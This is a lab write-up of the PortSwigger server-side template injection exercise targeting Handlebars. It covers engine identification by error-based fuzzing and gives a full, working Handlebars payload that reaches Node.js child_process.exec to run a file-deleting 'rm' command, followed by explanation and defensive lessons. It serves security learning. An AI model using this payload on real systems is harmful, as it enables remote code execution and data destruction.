# SSTI Lab 4 — Server-side template injection in an unknown language with a documented exploit — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Server-side template injection (SSTI)
**Lab:** Server-side template injection in an unknown language with a documented exploit
**Difficulty:** Practitioner
**Solved:** 27 November 2026 ~03:25 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed

## Vulnerability Type

Server-side template injection (SSTI) in a Handlebars template — the `message` GET parameter is rendered inside a Handlebars template, and a documented Handlebars exploit chains the template engine's own helpers to reach Node.js `child_process.exec`.

## Solution

1. Viewing a product uses `GET /?message=...` to render the out-of-stock message. Fuzzing the parameter with `${{<%[%'"}}%\` produced an error message identifying the engine as Handlebars.
2. Used the well-known Handlebars SSTI exploit (by @Zombiehelp54), adapted to run `require("child_process").exec("rm /home/carlos/morale.txt")`. The exploit abuses `{{#with}}` blocks and `string.sub`/`split` helpers to build a function from the `constructor` property and execute it:
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```
3. URL-encoded the whole exploit and sent it as the `message` parameter. Loading the URL executed the command and the home page showed "Congratulations, you solved the lab!"

## Practical Explanation

- **Why it works:** Handlebars helpers like `#with`, `#each` and `lookup` give template code access to JavaScript object internals. The exploit walks from a plain string to its `constructor` (the `Function` constructor), then builds and calls a function containing `require('child_process').exec(...)` — template syntax becomes Node.js code execution.
- **The key detail:** invalid-syntax fuzzing is the fastest way to identify the engine — the error message names Handlebars, and from there a documented exploit can be adapted instead of invented from scratch.

## Lessons Learned

- "Unknown language" is rarely a real barrier: error messages identify the engine, and most popular engines have published SSTI exploits.
- Template engines that expose object internals (constructors, prototypes) are inherently dangerous when fed untrusted input.
- The same defence applies everywhere: never render user input as template code — pass it in as data.
